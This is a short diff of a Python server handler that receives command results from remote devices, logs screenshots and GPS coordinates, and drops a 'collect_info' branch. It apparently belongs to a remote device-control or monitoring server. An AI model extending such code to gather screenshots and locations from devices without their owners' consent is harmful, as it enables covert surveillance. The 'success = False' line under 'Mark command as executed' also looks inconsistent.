@@ -112,19 +112,14 @@ def handle_command_response(request_handler, post_data):
         # Process result based on command type if known
         if isinstance(result, dict) and 'command_type' in data:
             command_type = data.get('command_type')
-
             # Special handling for different command types
             if command_type == 'capture_screenshot' and 'image_data' in result:
                 # Ensure image data is properly formatted
                 logger.info(f"Received screenshot from device {device_id}")
-
             elif command_type == 'get_location' and 'latitude' in result and 'longitude' in result:
                 # Add additional location information
                 logger.info(f"Received location data from device {device_id}: " +
                             f"{result.get('latitude')}, {result.get('longitude')}")
-
-            elif command_type == 'collect_info':
-                logger.info(f"Received device info from {device_id}")
 
         # Mark command as executed
         success = False
